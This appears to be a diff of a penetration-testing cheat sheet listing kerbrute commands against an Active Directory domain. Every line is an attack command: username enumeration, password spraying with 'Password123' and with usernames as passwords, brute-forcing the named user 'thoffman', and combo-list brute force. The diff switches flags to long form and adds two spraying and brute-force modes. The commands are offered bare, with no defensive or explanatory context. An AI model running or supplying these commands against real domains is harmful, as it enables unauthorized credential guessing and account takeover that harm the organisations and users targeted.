@@ -1,3 +1,5 @@
-kerbrute userenum -d "$DOMAIN" usernames.txt
-kerbrute passwordspray -d "$DOMAIN" domain_users.txt Password123
-kerbrute bruteuser -d "$DOMAIN" passwords.lst thoffman
+kerbrute userenum --domain "$DOMAIN" usernames.txt
+kerbrute passwordspray --domain "$DOMAIN" domain_users.txt Password123
+kerbrute passwordspray --user-as-pass --domain "$DOMAIN" domain_users.txt
+kerbrute bruteuser --domain "$DOMAIN" passwords.lst thoffman
+kerbrute bruteforce --domain "$DOMAIN" user_password.lst
